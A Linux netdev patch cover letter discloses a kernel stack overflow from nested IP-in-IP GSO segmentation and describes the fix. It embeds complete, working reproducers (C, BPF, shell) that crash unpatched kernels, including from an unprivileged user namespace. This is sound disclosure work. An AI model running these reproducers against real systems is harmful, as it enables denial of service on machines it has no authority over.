Received: from mail-pj2-f43.google.com (mail-pj2-f43.google.com [74.125.227.171])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E9FBB4F5DF0
	for <netdev@vger.kernel.org>; Tue, 22 Sep 2026 07:11:59 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.171
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790061122; cv=none; b=V3ETR4cg8Y6u4eIDfCC7487nz0FU2mijEcIOS+NizcYR+QOkZZ/GxncLyGlXH8IVbMDK8FdHXYSk3JoLv0qQ9wcg23KU9z47VpxmRK6IKnLpAWssdpDYxmMsc5mQ7Boibc9W1p2KpswgdoGgS8dmUOwglj3rjLuKlHi2DRD59S0=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790061122; c=relaxed/simple;
	bh=mNV50HDEaxsMsMUS0GdepnDVnzOcgL5vapCln75tVQ0=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=aSrFvArx+7clXJx3cjzebLbg3IWLr5lBN0tzN+d8JA8eZVjZ+XidM5uqe0w7ldV2auh2QCbUPZEXdMGw7/rM5Aumq13tYjiXPYrY6JmXM43tnLRU1k7yGplrc/+6GEhcxDUVKEeDWe8yOAuo28zAFyyuRoOJ0AYqwSPzcIOdUic=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=d7VoRNtn; arc=none smtp.client-ip=74.125.227.171
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="d7VoRNtn"
Received: by mail-pj2-f43.google.com with SMTP id 98e67ed59e1d1-396ccdaea76so1646091a91.0
        for <netdev@vger.kernel.org>; Tue, 22 Sep 2026 00:11:59 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790061119; x=1790665919; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=TPZ1dZm0XyPAmlN3+XJ6+eU0CDN8tjdnX3cdylqCsGM=;
        b=d7VoRNtnU7ASlV5WF+MuyTk1dQHyeAmF39AxHkUaMjYGz5Iq5tIajfIGE3LdpOs0jS
         MYgtTt4LzlS0RlzJLMjQ2/b3p9G++DmRtBLtoFKr+KB6YPltZOyC4DLtmAhghcQjsDTg
         3lqlFfH94qtAGh+twZxPtDHWRQFqcewyFjJMx0Gt/UzoJB4z2XC56NMkPPx9wVb15PNh
         HDo/7W7W69vRrQ0MiXqvM/8f4+RvUFRlIe6p6xXUlwj/jgN73A0GFGbg3K2OLiFMmTCQ
         WUFsdQ8/dPIH4pVW1eh8dk2ZRN/GPIDR4BU7JC162VGBCKgErA8byv2g6ZWEeA+Kk9We
         RApQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790061119; x=1790665919;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=TPZ1dZm0XyPAmlN3+XJ6+eU0CDN8tjdnX3cdylqCsGM=;
        b=qa9v3fjoPWdNDhoKu73+Oz/AeEndQah4N8YvjjDg2kewsCXBTQMWXF/Uto90IiSLpq
         FGcEvwfufB4IEiZZpK+KXS4Ckyr5yG8aBSaW68kmscX4Wfo0WtsPGUtqwQulbRPUznpm
         fpkwp2/d5x9fDELdRjdn6utPoUDiVDDEncN9FKFhXP4ob0VJoI2goqKjxP2WoNoEI5hS
         1y0kfZOeRiXEmXg7L1i6eyYk1UcXkqzhu3Dp/BqBb8Mzie0HU/36gUwR2pfIUPIO0fbJ
         4Vjm0DJ7ULpC0Bn9aLBCd52ntNK1sOS8glFvrfJHJd2OV8EZ68WdVT/4ZevF24t/5QP7
         3wYA==
X-Gm-Message-State: AFuF++kIa4wyFvSTs7vnUx0WzG05Mm0pEkrjFdsZina/NQs+a2ntGxSA
	i2tnT0hzWgL/z0NH+lrAT+I/FsxL+X8LrSLQeunyJV9+HN6BSINPoVxF2ikgfFhNsiWpHzwL7Fk
	b/D5CZQnyX+I=
X-Gm-Gg: AYBFou2h0Wmy7NzxUjh+LD6HP9fTlUCTPQHJ4Hy6u2LI8u2ZxKTjwbd9vffJSZas9JG
	JcA0U+QxkQl4tUm76Ysw4zLqOct8bo/3WoG8hzWyPEuu/zNfGiORo2199YNh5ozbbIzrSGOle9F
	89veH+HDqC67tnMdhu4jRyED8lbMZJvie23sYZELCHaVRX42bPgvLmswguus8Z4QwiwSEBbkI/s
	mCoeA7jBo4NFM3iM23V6NBcKMt63iE3+AoSGwhOCLVD1nZLGuaPVGs47/0TQATzPThLEM9JHizH
	F5IQMsSfNFtlDMDEuox3Xpzw94SPkMASsLPpbZ8DWEMNF4HJnbM6AK0C2JNFc1Koij7Z9N/CKIb
	yBGoweswml4VRDI/ORB9GWizgq9+kvXNjVkNuYoghq5Oy5qmhrV+0U8JZPTDjivLSe5iMn7B2fi
	UWkxUS04mXIZXgv9waf47RqNoFr5dxLkMbd1hlvNVCWqmeWgVCZrlU1w1u9qkbMXTo4ynFzycDb
	uNfPe9L+bBMCJiJrJR7sHwDtHWMMT9BbItRFcew
X-Received: by 2002:a17:90b:4a10:b0:39e:21c4:210c with SMTP id 98e67ed59e1d1-3a07362edbbmr128073a91.13.1790061118732;
        Tue, 22 Sep 2026 00:11:58 -0700 (PDT)
Received: from 954df21a5119.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3a0674df8bdsm3051240a91.16.2026.09.22.00.11.52
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 22 Sep 2026 00:11:57 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: linux-kernel@vger.kernel.org,
	"David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	David Ahern <dsahern@kernel.org>,
	Ido Schimmel <idosch@nvidia.com>,
	Kuniyuki Iwashima <kuniyu@google.com>,
	Willem de Bruijn <willemb@google.com>,
	Kees Cook <kees@kernel.org>,
	Richard Gobert <richardbgobert@gmail.com>,
	Jiayuan Chen <jiayuan.chen@linux.dev>,
	Zihan Xi <zihanx@nebusec.ai>
Subject: [PATCH net v4 0/1] net: gso: limit recursive IP-in-IP segmentation
Date: Tue, 22 Sep 2026 07:11:44 +0000
Message-ID: <cover.1790041241.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/core/gso.c and the IPv4/IPv6 GSO
handlers in net/ipv4/af_inet.c and net/ipv6/ip6_offload.c. The affected
path starts at skb_mac_gso_segment() and can re-enter either IP handler
for nested IP-in-IP headers. The bug is reachable by a non-root user
through user and network namespaces. The BPF/veth reproducer needs root
in the initial user namespace; the namespace-only reproducer starts as
UID 65534. The change is expected not to affect other functionality.
The current x86_64 validation covered both IPv4 trigger paths after this
reroll. IPv6 was compile-checked only.

Changes in v4:
  - Keep the budget check only at the two IP GSO handler entries; remove
    the common callback wrapper and other GSO call-site checks.
  - Reuse skb_gso_cb->mac_offset and current skb headroom as the
    cumulative header-offset budget.
  - v3 Link: https://lore.kernel.org/all/cover.1789802623.git.zihanx@nebusec.ai/

Changes in v3:
  - Treat an exhausted 256-byte budget as a callback-entry failure, including
    the zero-length check used by the common callback wrapper and IP handlers.
  - v2 Link: https://lore.kernel.org/all/cover.1789618203.git.zihanx@nebusec.ai/

Changes in v2:
  - Replace the callback counter with a cumulative 256-byte header budget
    carried in skb_gso_cb.
  - Apply the budget at common callback entry and across IP, GRE, UDP,
    MPLS, NSH, ESP, and IPv6 extension dispatch, including GRE/UDP
    context resets.
  - Rebase the UDP hunk onto selected revision c9151088f167 and rerun both
    IPv4 PoCs; use the decoded crash evidence from unpatched 88c17de85ddb.
  - v1 Link: https://lore.kernel.org/all/cover.1789302084.git.zihanx@nebusec.ai/

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

An IP-in-IP GSO packet reaches skb_mac_gso_segment() and re-enters the
IPv4 or IPv6 GSO handler for each nested IP header. The encap_level
only records header bytes; it does not bound callback depth. A deep
chain can exhaust the kernel stack before a transport GSO callback is
reached.

The fix uses the existing SKB_GSO_CB(skb)->mac_offset, initialized to the
original headroom for each top-level GSO operation. The difference between
current skb_headroom() and mac_offset is the number of bytes pulled from
the original MAC position. Both IP GSO handlers reject a new handler entry
once that offset reaches GSO_MAX_HEADER. Since interposed tunnel callbacks
do not reset mac_offset, nested dispatch cannot restart the budget.

GSO_MAX_HEADER is a practical 256-byte header-offset budget, not a measured
stack-overflow threshold or an architecture-independent stack-safety proof.
The budget includes link-layer/VLAN bytes already pulled from the original
MAC header, while IPv6 extension and tunnel headers consume it faster. Once
pulled headers reach 256 bytes, the next IPv4 or IPv6 GSO handler entry is
rejected.

The IPv4 stackable re-entry mechanism was introduced by
3347c9602955 ("ipv4: gso: make inet_gso_segment() stackable").
68c331631143 ("v4 GRE: Add TCP segmentation offload for GRE") predates it,
and cb32f511a70b ("ipip: add GSO/TSO support") later expanded the reachable
IP-in-IP path. The IPv6 stackable path was introduced separately by
d3e5e0062de5 ("ipv6: gso: make ipv6_gso_segment() stackable"). Fixes points
to 3347c9602955 for the IPv4 root cause.

Reproducer:

The minimal template form is:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

For this bug, the actual BPF/veth path is:

    make clean all
    ./poc.sh

The checked-in Makefile builds poc and tc_mutate.bpf.o. With KDIR unset,
the BPF command is:

    clang -O2 -g -target bpf -D__TARGET_ARCH_x86 -Wall -Wextra \
        -I/usr/include/x86_64-linux-gnu \
        -DINSERTED_IPS=199 -DTRIGGER_PORT=4242 \
        -c tc_mutate.bpf.c -o tc_mutate.bpf.o

The guest had no Python 3, so the run used the checked-in Perl fallback:

    ip netns exec "$NS" "$DIR/net-server-perl.sh" &

The namespace-only path was launched as UID 65534 with:

    cc -O2 -static -g -Wall -Wextra -o poc_privilege_optimized poc_privilege_optimized.c
    su -s /bin/sh nobody -c 'cd /tmp/q7x-ns && exec ./poc_privilege_optimized.sh 180 1400'

To prepare ethtool without a guest package install, the harness copied the
host /usr/sbin/ethtool and these runtime files into
/usr/local/lib/ethtool-host/:

    /lib/x86_64-linux-gnu/libmnl.so.0
    /lib/x86_64-linux-gnu/libm.so.6
    /lib/x86_64-linux-gnu/libc.so.6
    /lib64/ld-linux-x86-64.so.2

The wrapper was copied from verify/ethtool-host-wrapper-public.sh:

    ssh root@127.0.0.1 'mkdir -p /usr/local/lib/ethtool-host'
    scp /usr/sbin/ethtool /lib/x86_64-linux-gnu/libmnl.so.0 \
        /lib/x86_64-linux-gnu/libm.so.6 /lib/x86_64-linux-gnu/libc.so.6 \
        /lib64/ld-linux-x86-64.so.2 \
        root@127.0.0.1:/usr/local/lib/ethtool-host/
    scp verify/ethtool-host-wrapper-public.sh \
        root@127.0.0.1:/usr/local/lib/ethtool-host/ethtool-wrapper
    ssh root@127.0.0.1 \
        'chmod 755 /usr/local/lib/ethtool-host/ethtool-wrapper; \
         ln -sf /usr/local/lib/ethtool-host/ethtool-wrapper /usr/sbin/ethtool'

Packetdrill is not used because the trigger needs network namespaces,
IPIP devices, tc egress BPF header insertion, and UDP_SEGMENT control data,
which cannot be expressed as a packetdrill packet sequence.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

The current 245c47d2 revision built successfully with BUILD_RC=0. The
embedded PoC sources built with POC_BUILD_RC=0. The BPF/veth path ran as
UID 0 in the initial user namespace, used the Perl
listener fallback, sent 65536 bytes, and returned REMOTE_RC=0 and
DMESG_RC=0. The namespace-only path was launched externally as UID 65534,
mapped to UID 0 in a private user namespace, used depth 180 and gso_size
1400, sendmsg() returned 3676, and it returned REMOTE_RC=0 and DMESG_RC=0.
The fixed-kernel serial logs contained no BUG, Oops, stack guard, or kernel
panic markers. The IPv6 path was compile-checked only; no separate IPv6
runtime PoC was run.

The complete source files used by both paths are embedded below: poc.c,
poc.sh, tc_mutate.bpf.c, net-server-perl.sh, poc_privilege_optimized.c,
poc_privilege_optimized.sh, and Makefile.
------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

static void usage(const char *prog)
{
	fprintf(stderr, "Usage: %s <ip> <port> <bytes>\n", prog);
}

int main(int argc, char **argv)
{
	struct sockaddr_in addr;
	char *buf;
	unsigned long port;
	unsigned long total;
	size_t off = 0;
	int one = 1;
	int fd;

	if (argc != 4) {
		usage(argv[0]);
		return 1;
	}

	port = strtoul(argv[2], NULL, 0);
	total = strtoul(argv[3], NULL, 0);
	if (port > 65535 || total == 0) {
		fprintf(stderr, "invalid port or byte count\n");
		return 1;
	}

	buf = malloc(total);
	if (!buf) {
		perror("malloc");
		return 1;
	}
	for (off = 0; off < total; off++)
		buf[off] = 'A' + (off % 23);

	fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0) {
		perror("socket");
		free(buf);
		return 1;
	}

	if (setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one)) < 0) {
		perror("setsockopt(TCP_NODELAY)");
		close(fd);
		free(buf);
		return 1;
	}

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons((uint16_t)port);
	if (inet_pton(AF_INET, argv[1], &addr.sin_addr) != 1) {
		fprintf(stderr, "invalid IPv4 address\n");
		close(fd);
		free(buf);
		return 1;
	}

	if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		perror("connect");
		close(fd);
		free(buf);
		return 1;
	}

	off = 0;
	while (off < total) {
		ssize_t n = send(fd, buf + off, total - off, 0);

		if (n < 0) {
			perror("send");
			close(fd);
			free(buf);
			return 1;
		}
		off += (size_t)n;
	}

	fprintf(stderr, "sent %lu bytes to %s:%lu\n", total, argv[1], port);
	close(fd);
	free(buf);
	return 0;
}
------END poc.c--------

------BEGIN poc.sh------
#!/bin/sh
set -eu

DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)

NS=${NS:-q7xns}
OUTER_DEV0=${OUTER_DEV0:-q7xveth0}
OUTER_DEV1=${OUTER_DEV1:-q7xveth1}
OUTER0=${OUTER0:-10.10.0.1/24}
OUTER1=${OUTER1:-10.10.0.2/24}
OUTER0_IP=${OUTER0_IP:-10.10.0.1}
OUTER1_IP=${OUTER1_IP:-10.10.0.2}
TUN0=${TUN0:-q7xipip0}
TUN1=${TUN1:-q7xipip1}
INNER0_IP=${INNER0_IP:-198.18.0.1}
INNER1_IP=${INNER1_IP:-198.18.0.2}
TARGET_IP=${TARGET_IP:-198.18.0.2}
PORT=${PORT:-4242}
SEND_BYTES=${SEND_BYTES:-65536}
SERVER_PIDFILE=/tmp/q7x-server.pid

cleanup() {
	tc qdisc del dev "$OUTER_DEV0" clsact 2>/dev/null || true
	ip link del "$TUN0" 2>/dev/null || true
	ip netns del "$NS" 2>/dev/null || true
	ip link del "$OUTER_DEV0" 2>/dev/null || true
	rm -f "$SERVER_PIDFILE"
}

trap cleanup EXIT

gcc -O2 -Wall -Wextra -o "$DIR/poc" "$DIR/poc.c"
if [ ! -f "$DIR/tc_mutate.bpf.o" ]; then
	echo "missing tc_mutate.bpf.o; build it on the host with: make -C $DIR" >&2
	exit 1
fi

cleanup

ip netns add "$NS"
ip link add "$OUTER_DEV0" type veth peer name "$OUTER_DEV1"
ip link set "$OUTER_DEV1" netns "$NS"

ip addr add "$OUTER0" dev "$OUTER_DEV0"
ip link set "$OUTER_DEV0" up
ip netns exec "$NS" ip addr add "$OUTER1" dev "$OUTER_DEV1"
ip netns exec "$NS" ip link set lo up
ip netns exec "$NS" ip link set "$OUTER_DEV1" up

ethtool -K "$OUTER_DEV0" tso off gso off gro off sg off >/dev/null 2>&1 || true

ip link add "$TUN0" type ipip local "$OUTER0_IP" remote "$OUTER1_IP" dev "$OUTER_DEV0"
ip addr add "$INNER0_IP" peer "$INNER1_IP" dev "$TUN0"
ip link set "$TUN0" up

ip netns exec "$NS" ip link add "$TUN1" type ipip local "$OUTER1_IP" remote "$OUTER0_IP" dev "$OUTER_DEV1"
ip netns exec "$NS" ip addr add "$INNER1_IP" peer "$INNER0_IP" dev "$TUN1"
ip netns exec "$NS" ip link set "$TUN1" up

tc qdisc add dev "$OUTER_DEV0" clsact
tc filter add dev "$OUTER_DEV0" egress bpf da obj "$DIR/tc_mutate.bpf.o" sec tc

if command -v python3 >/dev/null 2>&1; then
    ip netns exec "$NS" python3 - <<'PY' &
import socket
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("198.18.0.2", 4242))
s.listen(1)
conn, _ = s.accept()
while conn.recv(65535):
    pass
PY
else
    echo "using Perl listener: $DIR/net-server-perl.sh" >&2
    ip netns exec "$NS" "$DIR/net-server-perl.sh" &
fi
echo $! > "$SERVER_PIDFILE"
sleep 1

"$DIR/poc" "$TARGET_IP" "$PORT" "$SEND_BYTES"
sleep 2
------END poc.sh--------

------BEGIN tc_mutate.bpf.c------
#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/pkt_cls.h>
#include <linux/tcp.h>
#include <stddef.h>

#ifndef INSERTED_IPS
#define INSERTED_IPS 199
#endif

#ifndef TRIGGER_PORT
#define TRIGGER_PORT 4242
#endif

#ifndef IP_DF
#define IP_DF 0x4000
#endif

#ifndef IPPROTO_IPIP
#define IPPROTO_IPIP 4
#endif

#ifndef IPPROTO_TCP
#define IPPROTO_TCP 6
#endif

#define SEC(NAME) __attribute__((section(NAME), used))
#define bpf_htons(x) ((__be16)__builtin_bswap16((__u16)(x)))
#define bpf_ntohs(x) ((__u16)__builtin_bswap16((__u16)(x)))
#define bpf_htonl(x) ((__be32)__builtin_bswap32((__u32)(x)))

#define INSERTED_LEN (INSERTED_IPS * (__u32)sizeof(struct iphdr))

static long (*bpf_skb_load_bytes)(struct __sk_buff *skb, __u32 off,
				  void *to, __u32 len) =
	(void *)BPF_FUNC_skb_load_bytes;
static long (*bpf_skb_adjust_room)(struct __sk_buff *skb, __s32 len_diff,
				   __u32 mode, __u64 flags) =
	(void *)BPF_FUNC_skb_adjust_room;
static long (*bpf_skb_store_bytes)(struct __sk_buff *skb, __u32 off,
				   const void *from, __u32 len,
				   __u64 flags) =
	(void *)BPF_FUNC_skb_store_bytes;
static long (*bpf_l3_csum_replace)(struct __sk_buff *skb, __u32 off,
				   __u64 from, __u64 to, __u64 size) =
	(void *)BPF_FUNC_l3_csum_replace;

static __always_inline int load_bytes(struct __sk_buff *skb, __u32 off,
				      void *dst, __u32 len)
{
	return bpf_skb_load_bytes(skb, off, dst, len);
}

SEC("tc")
int mutate_gso_chain(struct __sk_buff *skb)
{
	struct iphdr outer;
	struct iphdr inner;
	struct tcphdr th;
	__u32 off = sizeof(struct ethhdr);
	__u32 ins_off = off + sizeof(struct iphdr);
	__u16 new_tot;
	int i;

	if (skb->protocol != bpf_htons(ETH_P_IP))
		return TC_ACT_OK;
	if (skb->len < 2000)
		return TC_ACT_OK;
	if (load_bytes(skb, off, &outer, sizeof(outer)) < 0)
		return TC_ACT_OK;
	if (outer.version != 4 || outer.ihl != 5 || outer.protocol != IPPROTO_IPIP)
		return TC_ACT_OK;
	if (load_bytes(skb, ins_off, &inner, sizeof(inner)) < 0)
		return TC_ACT_OK;
	if (inner.version != 4 || inner.ihl != 5 || inner.protocol != IPPROTO_TCP)
		return TC_ACT_OK;
	if (load_bytes(skb, ins_off + sizeof(inner), &th, sizeof(th)) < 0)
		return TC_ACT_OK;
	if (th.dest != bpf_htons(TRIGGER_PORT))
		return TC_ACT_OK;
	if (bpf_skb_adjust_room(skb, INSERTED_LEN, BPF_ADJ_ROOM_NET,
				BPF_F_ADJ_ROOM_FIXED_GSO |
				BPF_F_ADJ_ROOM_NO_CSUM_RESET) < 0)
		return TC_ACT_SHOT;

	new_tot = bpf_htons(bpf_ntohs(outer.tot_len) + INSERTED_LEN);
	bpf_l3_csum_replace(skb, off + offsetof(struct iphdr, check),
			    outer.tot_len, new_tot, sizeof(new_tot));
	bpf_skb_store_bytes(skb, off + offsetof(struct iphdr, tot_len),
			    &new_tot, sizeof(new_tot), 0);

	for (i = 0; i < INSERTED_IPS; i++) {
		struct iphdr iph = {};

		iph.version = 4;
		iph.ihl = 5;
		iph.ttl = 64;
		iph.protocol = IPPROTO_IPIP;
		iph.frag_off = bpf_htons(IP_DF);
		iph.id = bpf_htons((__u16)(i + 1));
		iph.saddr = bpf_htonl(0x0a010001u + (__u32)i);
		iph.daddr = bpf_htonl(0x0a020001u + (__u32)i);

		if (bpf_skb_store_bytes(skb,
					ins_off + ((__u32)i * sizeof(struct iphdr)),
					&iph, sizeof(iph), 0) < 0)
			return TC_ACT_SHOT;
	}

	return TC_ACT_OK;
}

char _license[] SEC("license") = "GPL";
------END tc_mutate.bpf.c--------

------BEGIN net-server-perl.sh------
#!/bin/sh
exec perl -MIO::Socket::INET -e 'my $s = IO::Socket::INET->new(LocalAddr => "198.18.0.2", LocalPort => 4242, Listen => 1, ReuseAddr => 1) or die "server: $!\n"; my $c = $s->accept() or die "accept: $!\n"; my $buf; while (read($c, $buf, 65536)) {}'
------END net-server-perl.sh--------

------BEGIN poc_privilege_optimized.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/udp.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef UDP_SEGMENT
#define UDP_SEGMENT 103
#endif
#ifndef SOL_UDP
#define SOL_UDP 17
#endif

struct ipv4_min {
	uint8_t version_ihl;
	uint8_t tos;
	uint16_t tot_len;
	uint16_t id;
	uint16_t frag_off;
	uint8_t ttl;
	uint8_t protocol;
	uint16_t check;
	uint32_t saddr;
	uint32_t daddr;
} __attribute__((packed));

static void fill_ipip(struct ipv4_min *iph, unsigned int id, uint8_t protocol)
{
	memset(iph, 0, sizeof(*iph));
	iph->version_ihl = 0x45;
	iph->tot_len = htons(sizeof(*iph)); /* parser does not use this field */
	iph->id = htons((uint16_t)id);
	iph->ttl = 64;
	iph->protocol = protocol;
	iph->saddr = htonl(0x0a000001U);
	iph->daddr = htonl(0x0a000002U);
}

int main(int argc, char **argv)
{
	struct sockaddr_in bind_addr = { .sin_family = AF_INET };
	struct sockaddr_in dst = { .sin_family = AF_INET };
	struct msghdr msg = {0};
	struct iovec iov;
	unsigned char control[CMSG_SPACE(sizeof(uint16_t))];
	struct cmsghdr *cm;
	unsigned char *payload;
	unsigned int depth, segsz, payload_len, i;
	ssize_t ret;
	int fd;

	if (argc != 5) {
		fprintf(stderr, "usage: %s DEST PORT DEPTH GSO_SIZE\n", argv[0]);
		return 2;
	}
	depth = strtoul(argv[3], NULL, 0);
	segsz = strtoul(argv[4], NULL, 0);
	if (depth < 1 || depth > 3000 || segsz < 1 || segsz > 65535) {
		fprintf(stderr, "invalid depth or GSO size\n");
		return 2;
	}

	/*
	 * After tc changes the original inner IPv4 protocol UDP -> IPIP,
	 * the 8-byte UDP header and payload[0..11] are parsed as an IPv4
	 * header.  Source port 0x4500 supplies version=4, IHL=5.  payload[1]
	 * supplies protocol=IPIP.  The explicit headers start at payload+12.
	 */
	payload_len = 12 + depth * sizeof(struct ipv4_min) + 64;
	if (payload_len > 65507) {
		fprintf(stderr, "payload too large: %u\n", payload_len);
		return 2;
	}
	payload = calloc(1, payload_len);
	if (!payload) {
		perror("calloc");
		return 1;
	}
	payload[0] = 64;
	payload[1] = IPPROTO_IPIP;
	for (i = 0; i < depth; i++)
		fill_ipip((struct ipv4_min *)(payload + 12 + i * 20), i,
			  i + 1 == depth ? IPPROTO_UDP : IPPROTO_IPIP);

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket");
		return 1;
	}
	bind_addr.sin_port = htons(0x4500);
	bind_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	if (bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0) {
		perror("bind(0x4500)");
		return 1;
	}
	if (inet_pton(AF_INET, argv[1], &dst.sin_addr) != 1) {
		fprintf(stderr, "bad destination\n");
		return 2;
	}
	dst.sin_port = htons((uint16_t)strtoul(argv[2], NULL, 0));

	iov.iov_base = payload;
	iov.iov_len = payload_len;
	msg.msg_name = &dst;
	msg.msg_namelen = sizeof(dst);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = control;
	msg.msg_controllen = sizeof(control);
	memset(control, 0, sizeof(control));
	cm = CMSG_FIRSTHDR(&msg);
	cm->cmsg_level = SOL_UDP;
	cm->cmsg_type = UDP_SEGMENT;
	cm->cmsg_len = CMSG_LEN(sizeof(uint16_t));
	*(uint16_t *)CMSG_DATA(cm) = (uint16_t)segsz;

	fprintf(stderr, "uid=%u euid=%u send UDP_SEGMENT payload=%u depth=%u gso_size=%u source_port=0x4500\n",
		(unsigned)getuid(), (unsigned)geteuid(), payload_len, depth, segsz);
	ret = sendmsg(fd, &msg, 0);
	if (ret < 0) {
		fprintf(stderr, "sendmsg: %s (%d)\n", strerror(errno), errno);
		return 1;
	}
	fprintf(stderr, "sendmsg returned %zd\n", ret);
	close(fd);
	free(payload);
	return ret == (ssize_t)payload_len ? 0 : 1;
}
------END poc_privilege_optimized.c--------

------BEGIN poc_privilege_optimized.sh------
#!/bin/sh
set -eu

PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH

DEPTH=${1:-180}
GSO_SIZE=${2:-4096}

echo "launcher uid=$(id -u) gid=$(id -g)"
echo "status before unshare: $(awk '/^Uid:|^Gid:|^Cap/ {printf "%s ", $0}' /proc/self/status)"

exec unshare --user --map-root-user --net sh -eu -c '
	echo "inside uid=$(id -u) gid=$(id -g)"
	echo "uid_map: $(tr "\n" ";" </proc/self/uid_map)"
	echo "gid_map: $(tr "\n" ";" </proc/self/gid_map)"
	echo "status: $(awk '\''/^Uid:|^Gid:|^Cap/ {printf "%s ", $0}'\'' /proc/self/status)"

	ip link add q7dummy type dummy
	ip addr add 10.23.0.1/32 dev q7dummy
	ip link set q7dummy up
	ip route add 10.23.0.2/32 dev q7dummy

	ip link add q7tun type ipip local 10.23.0.1 remote 10.23.0.2 dev q7dummy
	ip addr add 198.18.7.1 peer 198.18.7.2 dev q7tun
	ip link set q7tun up

	# Make segmentation happen in software after the egress action.  Offset 29
	# is the protocol byte of the original inner IPv4 header (20 + 9).
	ethtool -K q7dummy tso off gso off gro off sg off \
		tx-ipxip4-segmentation off tx-udp-segmentation off
	tc qdisc add dev q7dummy clsact
	tc filter add dev q7dummy egress protocol ip pref 1 matchall \
		action pedit munge offset 29 u8 set 4

	./poc_privilege_optimized 198.18.7.2 9000 "$1" "$2"
' sh "$DEPTH" "$GSO_SIZE"
------END poc_privilege_optimized.sh--------

------BEGIN Makefile------
CC ?= gcc
CLANG ?= clang
KDIR ?=
BPF_CFLAGS ?= -O2 -g -target bpf -D__TARGET_ARCH_x86 -Wall -Wextra -I/usr/include/x86_64-linux-gnu $(if $(KDIR),-I$(KDIR)/tools/lib/bpf)
CFLAGS ?= -O2 -Wall -Wextra
INSERTED_IPS ?= 199
TRIGGER_PORT ?= 4242

all: poc tc_mutate.bpf.o

poc: poc.c
	$(CC) $(CFLAGS) -o $@ $<

tc_mutate.bpf.o: tc_mutate.bpf.c
	$(CLANG) $(BPF_CFLAGS) -DINSERTED_IPS=$(INSERTED_IPS) -DTRIGGER_PORT=$(TRIGGER_PORT) -c -o $@ $<

clean:
	rm -f poc tc_mutate.bpf.o
------END Makefile--------

----BEGIN crash log----
[namespace-only, UID 65534, unpatched 88c17de85ddb]
[   11.336820] BUG: TASK stack guard page was hit at ffff9ab440aebff8 (stack is ffff9ab440aec000..ffff9ab440af0000)
[   11.336823] Oops: stack guard page: 0000 [#1] SMP NOPTI
[   11.336825] CPU: 0 UID: 65534 PID: 403 Comm: poc_privilege_o Not tainted 7.2.0-rc4-g88c17de85ddb #1 PREEMPT(lazy) 
[   11.336826] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
